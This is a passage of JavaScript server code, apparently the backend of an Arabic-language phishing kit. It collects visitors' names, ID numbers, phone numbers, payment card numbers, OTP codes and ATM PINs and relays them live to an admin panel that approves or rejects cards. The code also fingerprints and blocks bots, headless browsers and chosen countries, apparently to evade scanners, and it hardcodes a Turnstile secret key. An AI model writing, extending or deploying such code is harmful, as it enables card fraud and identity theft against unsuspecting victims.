          if (activeVisitor._id === v._id) currentSocketId = sid;
        });
      }
      return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected };
    });

    // Sort by last activity/update
    visitorsWithStatus.sort((a, b) => {
      const dateA = a.lastActivity || (a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0);
      const dateB = b.lastActivity || (b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0);
      return dateB - dateA;
    });

    // Only send to admin sockets, not all sockets
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitors:update", visitorsWithStatus.slice(0, 100)); // Send top 100
    });
  }, throttleMs);
}

// === Anti-Bot Protection ===
// Track connections per IP (max concurrent connections per IP)
const ipConnectionCount = new Map();
// Track new visitor registrations per minute
let newVisitorTimestamps = [];
const MAX_CONNECTIONS_PER_IP = 3; // max 3 concurrent connections per IP (real users have 1-2 tabs max)
const MAX_NEW_VISITORS_PER_MINUTE = 30; // max 30 new visitors per minute globally
const TURNSTILE_GRACE_PERIOD = 10000; // 10 seconds grace period for token to arrive
const NEW_VISITOR_WINDOW = 60 * 1000; // 1 minute

// === Smart Anti-DDoS Protection ===
// Adaptive burst detection with graduated response
let recentConnections = []; // timestamps of recent connections
const BURST_WINDOW = 5000; // 5 second window
const MAX_ACTIVE_VISITORS = 200; // hard cap on concurrent visitors
let protectionLevel = 0; // 0=normal, 1=slow, 2=slower, 3=block
let protectionLevelUntil = 0;

// IP registration velocity tracking (how fast same IP registers)
const ipRegisterTimestamps = new Map(); // ip -> [timestamps]

function checkBurst() {
  const now = Date.now();
  recentConnections = recentConnections.filter(t => t > now - BURST_WINDOW);
  // Hard cap: prevent memory growth during massive attacks
  if (recentConnections.length > 500) recentConnections = recentConnections.slice(-100);
  const count = recentConnections.length;
  
  // Graduated protection levels
  if (count >= 40 && protectionLevel < 3) {
    protectionLevel = 3;
    protectionLevelUntil = now + 30000;
    console.log(`🔴 PROTECTION LEVEL 3 (BLOCK): ${count} connections in ${BURST_WINDOW/1000}s`);
  } else if (count >= 25 && protectionLevel < 2) {
    protectionLevel = 2;
    protectionLevelUntil = now + 20000;
    console.log(`🟠 PROTECTION LEVEL 2 (SLOW 5s): ${count} connections in ${BURST_WINDOW/1000}s`);
  } else if (count >= 15 && protectionLevel < 1) {
    protectionLevel = 1;
    protectionLevelUntil = now + 15000;
    console.log(`🟡 PROTECTION LEVEL 1 (SLOW 2s): ${count} connections in ${BURST_WINDOW/1000}s`);
  }
  
  // Auto-deactivate when timer expires
  if (protectionLevel > 0 && now > protectionLevelUntil) {
    console.log(`✅ PROTECTION DEACTIVATED (was level ${protectionLevel})`);
    protectionLevel = 0;
  }
}

// Check if IP is registering too fast (bot behavior)
function isIPTooFast(ip) {
  const now = Date.now();
  const timestamps = ipRegisterTimestamps.get(ip) || [];
  // Keep only last 60 seconds
  const recent = timestamps.filter(t => t > now - 60000);
  recent.push(now);
  ipRegisterTimestamps.set(ip, recent);
  // More than 2 registrations per minute from same IP = suspicious
  return recent.length > 2;
}

// Track unregistered sockets (connected but never sent visitor:register)
const unregisteredSockets = new Map(); // socketId -> timestamp

// Clean up old timestamps every 30 seconds
setInterval(() => {
  const now = Date.now();
  const cutoff = now - NEW_VISITOR_WINDOW;
  newVisitorTimestamps = newVisitorTimestamps.filter(t => t > cutoff);
  if (newVisitorTimestamps.length > 500) newVisitorTimestamps = newVisitorTimestamps.slice(-100);
  // Clean IP registration timestamps
  for (const [ip, timestamps] of ipRegisterTimestamps) {
    const recent = timestamps.filter(t => t > cutoff);
    if (recent.length === 0) ipRegisterTimestamps.delete(ip);
    else ipRegisterTimestamps.set(ip, recent);
  }
  // Safety cap: prevent Maps from growing too large during attacks
  if (rateLimitMap.size > 5000) {
    console.log(`[SAFETY] rateLimitMap too large (${rateLimitMap.size}), clearing old entries`);
    const entries = [...rateLimitMap.entries()].sort((a, b) => b[1].firstRequest - a[1].firstRequest);
    rateLimitMap.clear();
    entries.slice(0, 1000).forEach(([k, v]) => rateLimitMap.set(k, v));
  }
  if (ipConnectionCount.size > 5000) {
    console.log(`[SAFETY] ipConnectionCount too large (${ipConnectionCount.size}), clearing`);
    ipConnectionCount.clear();
  }
  if (ipRegisterTimestamps.size > 5000) {
    console.log(`[SAFETY] ipRegisterTimestamps too large (${ipRegisterTimestamps.size}), clearing`);
    ipRegisterTimestamps.clear();
  }
  
  // Disconnect sockets that connected but never registered within 10 seconds
  // IMPORTANT: Skip admin sockets - they use admin:register, not visitor:register
  for (const [sid, connectTime] of unregisteredSockets) {
    if (now - connectTime > 30000) {
      // Skip if this is an admin socket
      if (admins.has(sid)) {
        unregisteredSockets.delete(sid);
        continue;
      }
      const sock = io.sockets.sockets.get(sid);
      if (sock && sock.connected) {
        console.log(`Ghost socket cleanup: ${sid} (connected ${Math.round((now-connectTime)/1000)}s ago, never registered)`);
        sock.disconnect(true);
      }
      unregisteredSockets.delete(sid);
    }
  }
}, 15000);

// Block unauthorized WebSocket connections - FULL PROTECTION
io.use((socket, next) => {
  const origin = socket.handshake.headers.origin || socket.handshake.headers.referer || '';
  const ua = socket.handshake.headers['user-agent'] || '';
  let ip = socket.handshake.headers['cf-connecting-ip'] || socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
  const isAdmin = socket.handshake.query?.admin === 'true' || (origin && origin.includes('railway.app'));
  
  console.log(`[io.use] Connection from: origin=${origin}, IP=${ip}, admin=${isAdmin}`);
  
  // Skip all protections for admin connections
  if (isAdmin) return next();
  
  // -1. Check IP blacklist FIRST
  if (isBlacklisted(ip)) {
    console.log(`[io.use] BLACKLISTED IP blocked: ${ip}`);
    return next(new Error('Access denied'));
  }
  
  // 0. Origin check - only allow connections from allowed domains
  if (origin) {
    const allowed = buildAllowedOrigins();
    const isAllowedOrigin = allowed.some(a => origin.startsWith(a));
    if (!isAllowedOrigin) {
      console.log(`[io.use] BLOCKED - unauthorized origin: ${origin}, IP=${ip}`);
      return next(new Error('Unauthorized origin'));
    }
  } else if (process.env.NODE_ENV === 'production') {
    // In production, block connections with no origin (direct access)
    console.log(`[io.use] BLOCKED - no origin header, IP=${ip}`);
    return next(new Error('Direct access not allowed'));
  }
  
  // 1. Bot detection by User-Agent
  if (isBot(ua)) {
    console.log(`[io.use] Bot blocked: IP=${ip}, UA=${ua.substring(0, 60)}`);
    if (botRedirectUrl) {
      socket._botRedirect = true;
    } else {
      return next(new Error('Bot detected'));
    }
  }
  
  // 2. Connection Token check - visitors must have a valid token
  const connToken = socket.handshake.auth?.token || '';
  const existingVisitorId = socket.handshake.query?.visitorId || '';
  
  // Check returning visitors - they have a saved visitorId in localStorage
  const isReturning = existingVisitorId && savedVisitors.find(v => v._id === existingVisitorId);
  
  if (isReturning) {
    // Check if returning visitor is blocked - reject connection immediately
    const returningVisitor = savedVisitors.find(v => v._id === existingVisitorId);
    if (returningVisitor && returningVisitor.isBlocked) {
      console.log(`[io.use] Blocked visitor rejected: ${existingVisitorId}, IP=${ip}`);
      return next(new Error('blocked'));
    }
    // Returning visitor - still verify they have a valid token OR valid origin
    // This prevents bots from reusing stolen visitorIds
    if (connToken && connectionTokens.has(connToken)) {
      const tokenData = connectionTokens.get(connToken);
      if (!tokenData.used && (Date.now() - tokenData.createdAt <= TOKEN_EXPIRY)) {
        tokenData.used = true;
        console.log(`[io.use] Returning visitor with valid token, IP=${ip}`);
      }
    }
    // Returning visitors still need valid origin (checked above) + not be a bot (checked above)
    // But we don't require a token since they already proved themselves before
    console.log(`[io.use] Returning visitor: ${existingVisitorId}, IP=${ip}`);
  } else {
    // New visitor - must have a valid connection token
    if (!connToken || !connectionTokens.has(connToken)) {
      console.log(`[io.use] Rejected - no valid token, IP=${ip}`);
      return next(new Error('Connection token required'));
    }
    const tokenData = connectionTokens.get(connToken);
    if (tokenData.used || (Date.now() - tokenData.createdAt > TOKEN_EXPIRY)) {
      connectionTokens.delete(connToken);
      console.log(`[io.use] Rejected - token expired/used, IP=${ip}`);
      return next(new Error('Token expired'));
    }
    // Mark token as used
    tokenData.used = true;
  }
  
  // 3. IP Connection Limit
  const currentCount = ipConnectionCount.get(ip) || 0;
  if (currentCount >= MAX_CONNECTIONS_PER_IP) {
    console.log(`[io.use] IP limit: ${ip} has ${currentCount} connections`);
    blacklistIP(ip, 'too_many_connections');
    return next(new Error('Too many connections'));
  }
  ipConnectionCount.set(ip, currentCount + 1);
  socket._antiBot_ip = ip;
  socket.on('disconnect', () => {
    const count = ipConnectionCount.get(socket._antiBot_ip) || 1;
    if (count <= 1) ipConnectionCount.delete(socket._antiBot_ip);
    else ipConnectionCount.set(socket._antiBot_ip, count - 1);
  });
  
  // 4. Hard cap on active visitors
  if (visitors.size >= MAX_ACTIVE_VISITORS) {
    console.log(`[io.use] Hard cap reached: ${visitors.size} visitors`);
    return next(new Error('Server busy, try again later'));
  }
  
  // 5. Burst detection + Smart protection levels
  recentConnections.push(Date.now());
  checkBurst();
  if (protectionLevel >= 3) {
    console.log(`[io.use] Protection level 3 - blocking`);
    return next(new Error('Server busy, try again later'));
  }
  if (protectionLevel >= 1) {
    const delay = protectionLevel >= 2 ? 5000 : 2000;
    return setTimeout(() => next(), delay);
  }
  
  next();
});

// Turnstile Server-Side Verification
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY || '0x4AAAAAACxQZ3_C1a5ewkGBgczNzbZylZ0';

async function verifyTurnstileToken(token, ip) {
  if (!token) return { success: false, reason: 'no_token' };
  try {
    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${TURNSTILE_SECRET_KEY}&response=${token}&remoteip=${ip || ''}`,
    });
    const result = await response.json();
    return { success: result.success, reason: result.success ? 'valid' : 'invalid_token' };
  } catch (error) {
    console.error('Turnstile verification error:', error.message);
    return { success: false, reason: 'verification_error' }; // Don't auto-allow on error - fallback to fingerprint+behavior
  }
}

// Browser Fingerprint Validation (fallback when Turnstile fails)
function validateFingerprint(fp) {
  if (!fp || typeof fp !== 'object') return { valid: false, reason: 'no_fingerprint' };
  
  let score = 0;
  const reasons = [];
  
  // Real browsers have screen dimensions
  if (fp.screenWidth > 0 && fp.screenHeight > 0) {
    score += 10;
  } else {
    reasons.push('no_screen');
  }
  
  // Real browsers have color depth (usually 24 or 32)
  if (fp.colorDepth >= 24) {
    score += 8;
  } else {
    reasons.push('low_color_depth');
  }
  
  // Real browsers have a language
  if (fp.language && fp.language.length >= 2) {
    score += 8;
  } else {
    reasons.push('no_language');
  }
  
  // Real browsers have a timezone
  if (fp.timezone && fp.timezone.length > 0) {
    score += 8;
  } else {
    reasons.push('no_timezone');
  }
  
  // Real browsers have hardware concurrency (CPU cores)
  if (fp.hardwareConcurrency > 0) {
    score += 8;
  } else {
    reasons.push('no_cpu');
  }
  
  // Real browsers have canvas rendering
  if (fp.canvasHash && fp.canvasHash !== 'no_canvas' && fp.canvasHash !== 'error') {
    score += 10;
  } else {
    reasons.push('no_canvas');
  }
  
  // Real browsers have WebGL
  if (fp.webglVendor && fp.webglVendor !== 'no_webgl' && fp.webglVendor !== 'error') {
    score += 8;
    
    // WebGL Renderer check - detect headless browsers
    const renderer = (fp.webglRenderer || '').toLowerCase();
    const HEADLESS_RENDERERS = ['swiftshader', 'llvmpipe', 'softpipe', 'mesa', 'virtualbox', 'vmware'];
    const isHeadlessGPU = HEADLESS_RENDERERS.some(h => renderer.includes(h));
    
    if (isHeadlessGPU) {
      // SwiftShader/llvmpipe = headless browser (Puppeteer, Playwright, etc.)
      score -= 30;
      reasons.push('headless_gpu:' + renderer.substring(0, 40));
      console.log(`[ANTI-BOT] Headless GPU detected: ${renderer}`);
    } else if (renderer && renderer !== 'no_debug' && renderer !== 'unknown') {
      // Real GPU (NVIDIA, AMD, Intel, Apple, Adreno, Mali, etc.) = bonus points
      score += 10;
    }
  } else {
    // no_webgl: iOS Safari sometimes hides this - don't penalize heavily
    // Check if it's likely iOS (has touch + Apple platform)
    const isLikelyIOS = fp.maxTouchPoints > 0 && (fp.platform || '').match(/iPhone|iPad|iPod|MacIntel/i);
    if (isLikelyIOS) {
      // iOS device without WebGL debug info - normal, don't penalize
      reasons.push('no_webgl_ios_ok');
    } else {
      reasons.push('no_webgl');
    }
  }
  
  // Real browsers have fonts
  if (fp.fontsCount > 2) {
    score += 8;
  } else {
    reasons.push('few_fonts');
  }
  
  // Real browsers have storage APIs
  if (fp.hasLocalStorage && fp.hasSessionStorage) {
    score += 5;
  } else {
    reasons.push('no_storage');
  }
  
  // Mobile devices have touch points
  if (fp.maxTouchPoints > 0) {
    score += 5;
  }
  
  // === NEW: Enhanced fingerprint checks ===
  
  // Audio fingerprint - real browsers produce unique audio hash
  if (fp.audioHash && fp.audioHash !== 'no_audio' && fp.audioHash !== 'error' && fp.audioHash !== 'silent' && fp.audioHash !== '0') {
    score += 8;
  } else if (fp.audioHash === 'silent' || fp.audioHash === '0') {
    // Silent audio = likely headless
    score -= 5;
    reasons.push('silent_audio');
  }
  
  // Performance timing consistency
  if (fp.perfTimingConsistent === true) {
    score += 5;
  } else if (fp.perfTimingConsistent === false) {
    score -= 10;
    reasons.push('perf_timing_fake');
  }
  
  // Chrome consistency - if UA says Chrome but no chrome object
  if (fp.chromeConsistent === false) {
    score -= 15;
    reasons.push('chrome_inconsistent');
  } else if (fp.chromeConsistent === true) {
    score += 5;
  }
  
  // Navigator properties natural (not overridden with Object.defineProperty)
  if (fp.navigatorPropsNatural === false) {
    score -= 15;
    reasons.push('navigator_overridden');
  } else if (fp.navigatorPropsNatural === true) {
    score += 5;
  }
  
  // Permissions API - exists in all modern browsers
  if (fp.hasPermissions === true) {
    score += 3;
  }
  
  // Device memory (Chrome-specific, 0 in Safari/Firefox which is ok)
  if (fp.deviceMemory > 0) {
    score += 3;
  }
  
  // Connection type - real browsers usually report this
  if (fp.connectionType && fp.connectionType !== 'unknown') {
    score += 3;
  }
  
  // Running in iframe = suspicious (clickjacking or bot framework)
  if (fp.isInIframe === true) {
    score -= 10;
    reasons.push('in_iframe');
  }
  
  // === Anti-Automation Detection (instant bot kill - real browsers NEVER trigger these) ===
  
  // WebDriver flag: Puppeteer/Playwright/Selenium set navigator.webdriver = true
  if (fp.isWebDriver === true) {
    reasons.push('webdriver_detected');
    console.log(`[ANTI-BOT] WebDriver detected! Instant block.`);
    return { valid: false, score: 0, reasons: reasons.join(','), reason: 'webdriver_bot' };
  }
  
  // Desktop browsers always have plugins (Chrome has at least 3-5 default plugins)
  // Headless Chrome has 0 plugins. Mobile browsers may have 0 so only check desktop.
  if (fp.pluginCount === 0 && fp.maxTouchPoints === 0) {
    score -= 15;
    reasons.push('no_plugins_desktop');
  }
  
  // Notification API exists in all real browsers
  if (fp.hasNotificationPermission === false) {
    score -= 5;
    reasons.push('no_notification_api');
  }
  
  // Score threshold: 40+ = likely real browser
  // Max possible score ~110+ for real browsers, bots typically get 20-35
  const valid = score >= 40;
  return { valid, score, reasons: reasons.join(','), reason: valid ? 'fingerprint_ok' : 'fingerprint_bot' };
}

// === NEW: Behavioral Analysis Validation ===
function validateBehavior(bh) {
  if (!bh || typeof bh !== 'object') return { valid: false, score: 0, reason: 'no_behavior' };
  
  let score = 0;
  const reasons = [];
  const isMobile = bh.touchEvents > 0;
  
  // Mouse/Touch interaction (max 30 points)
  if (isMobile) {
    if (bh.touchEvents >= 1) score += 10;
    if (bh.touchEvents >= 3) score += 10;
    if (bh.touchEvents >= 5) score += 10;
  } else {
    if (bh.mouseMovements >= 5) score += 10;
    if (bh.mouseMovements >= 20) score += 10;
    if (bh.mousePath >= 200) score += 10;
  }
  
  // Typing behavior (max 30 points)
  if (bh.keystrokes >= 3) score += 10;
  if (bh.avgKeystrokeInterval >= 50 && bh.avgKeystrokeInterval <= 500) score += 10;
  if (bh.keystrokeVariance >= 100) score += 10;
  
  // Instant typing (0ms interval with many keystrokes) = bot
  if (bh.keystrokes >= 5 && bh.avgKeystrokeInterval < 10) {
    score -= 20;
    reasons.push('instant_typing');
  }
  
  // Scrolling (max 15 points)
  if (bh.scrollEvents >= 1) score += 5;
  if (bh.scrollEvents >= 3) score += 5;
  if (bh.totalScrollDistance >= 100) score += 5;
  
  // Clicks/Taps (max 10 points)
  if (bh.clickCount >= 1) score += 5;
  if (bh.clickCount >= 3) score += 5;
  
  // Time on page (max 15 points)
  if (bh.timeOnPage >= 3000) score += 5;
  if (bh.timeOnPage >= 8000) score += 5;
  if (bh.timeOnPage >= 15000) score += 5;
  
  // No interaction at all = very suspicious
  if (bh.interactionStartDelay === -1) {
    score -= 15;
    reasons.push('no_interaction');
  }
  
  // Too fast (submitted in under 2 seconds with data) = bot
  if (bh.timeOnPage < 2000 && bh.keystrokes > 0) {
    score -= 20;
    reasons.push('too_fast');
  }
  
  const valid = score >= 20;
  return { valid, score, reasons: reasons.join(','), reason: valid ? 'behavior_ok' : 'behavior_bot' };
}

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  const connUA = socket.handshake.headers['user-agent'] || '';
  const connIP = socket.handshake.headers['cf-connecting-ip'] || socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  const connOrigin = socket.handshake.headers.origin || socket.handshake.headers.referer || 'none';
  const connTransport = socket.conn?.transport?.name || 'unknown';
  const isSafari = connUA.includes('Safari') && !connUA.includes('Chrome') && !connUA.includes('CriOS');
  console.log(`New connection: ${socket.id}, IP=${connIP}, transport=${connTransport}, browser=${isSafari ? 'SAFARI' : 'Chrome/Other'}, origin=${connOrigin}`);
  
  // Track unregistered sockets - will be cleaned up if no visitor:register within 10s
  unregisteredSockets.set(socket.id, Date.now());
  socket.on('disconnect', (reason) => {
    console.log(`Socket disconnected: ${socket.id}, reason=${reason}, browser=${isSafari ? 'SAFARI' : 'Chrome/Other'}, IP=${connIP}`);
    unregisteredSockets.delete(socket.id);
  });

  // Handle visitor registration
  socket.on("visitor:register", async (data) => {
    console.log(`[DEBUG] visitor:register received from socket ${socket.id}, data:`, JSON.stringify(data));
    // Mark as registered (remove from ghost tracking)
    unregisteredSockets.delete(socket.id);
    
    const visitorInfo = getVisitorInfo(socket);
    
    // Server-side country block check
    const visitorCountryCode = visitorInfo.country; // Cloudflare sends 2-letter code e.g. "JO", "SA"
    if (visitorCountryCode && visitorCountryCode !== 'Unknown') {
      const visitorCountryName = countryCodeToName[visitorCountryCode.toUpperCase()] || visitorCountryCode;
      const isCountryBlocked = globalBlockedCountries.some(c => 
        c.toLowerCase() === visitorCountryName.toLowerCase() || c.toLowerCase() === visitorCountryCode.toLowerCase()
      );
      if (isCountryBlocked) {
        console.log(`[visitor:register] Country blocked: ${visitorCountryCode} (${visitorCountryName}), IP=${visitorInfo.ip}`);
        socket.emit("blocked");
        // Disconnect after client receives blocked event and stops reconnection
        setTimeout(() => socket.disconnect(), 2000);
        return;
      }
    }
    
    // DON'T add visitor to active list yet - only mark socket as connected
    // Visitor will be added when they submit their first data (more-info event)
    socket._visitorConnected = true;
    socket._visitorId = data?.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
    socket._visitorInfo = visitorInfo;
    
    // IP velocity check for new visitors (skip returning visitors)
    const existingId = data?.existingVisitorId;
    const isReturningVisitor = existingId && savedVisitors.find(v => v._id === existingId);
    if (!isReturningVisitor && isIPTooFast(visitorInfo.ip)) {
      console.log(`[visitor:register] IP velocity block: ${visitorInfo.ip} registering too fast`);
      blacklistIP(visitorInfo.ip, 'registration_too_fast');
      socket.disconnect();
      return;
    }
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Anti-Bot: Check if too many new visitors per minute
      const now_check = Date.now();
      const cutoff = now_check - NEW_VISITOR_WINDOW;
      newVisitorTimestamps = newVisitorTimestamps.filter(t => t > cutoff);
      if (newVisitorTimestamps.length >= MAX_NEW_VISITORS_PER_MINUTE) {
        console.log(`Anti-Bot: Blocked new visitor registration from IP ${visitorInfo.ip} - too many new visitors (${newVisitorTimestamps.length}/${MAX_NEW_VISITORS_PER_MINUTE} per minute)`);
        socket.disconnect();
        return;
      }
      newVisitorTimestamps.push(now_check);
      
      // Create new visitor
      visitorCounter++;
      if (displayVisitorCount !== null) displayVisitorCount++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        rejectedCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);

      // Lookup country and city from IP if unknown
      if (visitor.country === 'Unknown') {
        lookupGeo(visitor.ip).then(geo => {
          visitor.country = geo.country;
          visitor.city = geo.city;
          saveData();
          admins.forEach((admin, sid) => {
            io.to(sid).emit('admin:visitorUpdated', visitor);
          });
        });
      }
    }

    visitors.set(socket.id, visitor);
    saveData();

    // Store registration time to prevent instant bot chat
    socket._registeredAt = Date.now();

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });
    // If visitor was blocked, re-send blocked event with delay to ensure client listener is ready
    if (visitor.isBlocked) {
      // Check if block was country-based and country is no longer blocked
      const vCountryCode = visitor.country;
      if (vCountryCode && vCountryCode !== 'Unknown') {
        const vCountryName = countryCodeToName[vCountryCode.toUpperCase()] || vCountryCode;
        const isStillCountryBlocked = globalBlockedCountries.some(c =>
          c.toLowerCase() === vCountryName.toLowerCase() || c.toLowerCase() === vCountryCode.toLowerCase()
        );
        if (!isStillCountryBlocked && visitor.blockReason === 'country') {
          // Country no longer blocked - auto-unblock visitor
          visitor.isBlocked = false;
          const idx = savedVisitors.findIndex(v => v._id === visitor._id);
          if (idx >= 0) savedVisitors[idx].isBlocked = false;
          saveData();
          console.log(`[auto-unblock] Visitor ${visitor._id} unblocked - country ${vCountryCode} no longer blocked`);
        }
      }
      // If still blocked (manual block or country still blocked), disconnect
      if (visitor.isBlocked) {
        setTimeout(() => {
          socket.emit("blocked");
          // Disconnect after client receives blocked event and stops reconnection
          setTimeout(() => socket.disconnect(), 2000);
        }, 300);
      }
    }

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        const dvCount = displayVisitorCount !== null ? displayVisitorCount : new Set(savedVisitors.map(v => v.ip).filter(ip => ip)).size || savedVisitors.length;
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true }, { displayVisitorCount: dvCount, connectedVisitors: visitors.size });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id, connectedVisitors: visitors.size });
      }
    });

  });

  // Handle late Turnstile token (sent after initial registration)
  socket.on("visitor:lateToken", async (data) => {
    const token = data?.turnstileToken || '';
    if (!token || !socket._awaitingToken) return;
    
    const visitorInfo = getVisitorInfo(socket);
    const turnstileResult = await verifyTurnstileToken(token, visitorInfo.ip);
    
    if (turnstileResult.success) {
      socket._turnstileVerified = true;
      socket._awaitingToken = false;
      if (socket._tokenTimeout) clearTimeout(socket._tokenTimeout);
      console.log(`Turnstile LATE OK: IP=${visitorInfo.ip}, token verified after delay`);
    } else {
      console.log(`Turnstile LATE FAILED: IP=${visitorInfo.ip}, invalid token`);
      // Don't disconnect - the timeout will handle it if still awaiting
    }
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      visitor.waitingForAdminResponse = false;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
          waitingForAdminResponse: false,
        });
      });
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {
    console.log(`[DEBUG] more-info received from socket ${socket.id}, data:`, JSON.stringify(data));
    let visitor = visitors.get(socket.id);
    if (!visitor) {
      // Create full visitor if not exists (e.g. reconnect after server redeploy)
      const visitorInfo = getVisitorInfo(socket);
      const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
      visitorCounter++;
      if (displayVisitorCount !== null) displayVisitorCount++;
      visitor = {
        _id: data.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: data.page || "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        rejectedCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
      };
      // Lookup country and city from IP if unknown
      if (visitor.country === 'Unknown') {
        lookupGeo(visitor.ip).then(geo => {
          visitor.country = geo.country;
          visitor.city = geo.city;
          saveData();
          admins.forEach((admin, sid) => {
            io.to(sid).emit('admin:visitorUpdated', visitor);
          });
        });
      }
      savedVisitors.push(visitor);
      visitors.set(socket.id, visitor);
      saveData();
      broadcastSiteVisitors();
      broadcastVisitorsToAdmins();
      console.log(`[more-info] Created full visitor from more-info: ${visitor._id}, IP=${visitor.ip}, country=${visitor.country}`);
    }
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Only update lastDataUpdate if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
      }
      if (data.paymentCard) {
        const newCardNumber = data.paymentCard.cardNumber;
        // Check if card prefix is globally blocked
        const cardPrefix = newCardNumber.replace(/\s/g, '').substring(0, 4);
        if (globalBlockedCards.includes(cardPrefix)) {
          socket.emit("card:globalBlocked");
          console.log(`Globally blocked card rejected for visitor ${visitor._id}: prefix ${cardPrefix}`);
          return;
        }
        // Check if card was previously rejected by admin
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber);
        
        if (isAdminRejected) {
          // Card was rejected by admin before - auto reject
          socket.emit("card:duplicateRejected");
          // Reset waiting status since card was auto-rejected
          visitor.waitingForAdminResponse = false;
          visitor.lastDataUpdate = new Date().toISOString();
          // Save rejection permanently
          if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
          visitor.duplicateCardRejections.push({ cardNumber: newCardNumber, timestamp: new Date().toISOString() });
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          // Notify admins about auto-rejected card
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:duplicateCard", {
              visitorId: visitor._id,
              cardNumber: newCardNumber,
              visitor: visitor,
            });
          });
          console.log(`Admin-rejected card auto-rejected for visitor ${visitor._id}: ${newCardNumber}`);
          return; // Don't continue processing
        } else {
          const now = new Date().toISOString();
          visitor.paymentCards.push({
            ...data.paymentCard,
            timestamp: now,
          });
          // Start tracking from card page
          visitor.lastDataUpdate = now;
          visitor.hasEnteredCardPage = true;
        }
      }
      if (data.digitCode) {
        // Check for duplicate OTP code
        const isDuplicateCode = visitor.digitCodes && visitor.digitCodes.some(dc => dc.code === data.digitCode);
        if (isDuplicateCode && data.page !== "كلمة مرور ATM") {
          // Reject duplicate OTP - notify visitor
          socket.emit("otp:duplicateRejected");
          visitor.waitingForAdminResponse = false;
          visitor.lastDataUpdate = new Date().toISOString();
          // Save duplicate OTP rejection permanently
          if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
          visitor.duplicateOtpRejections.push({ code: data.digitCode, page: data.page, timestamp: new Date().toISOString() });
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
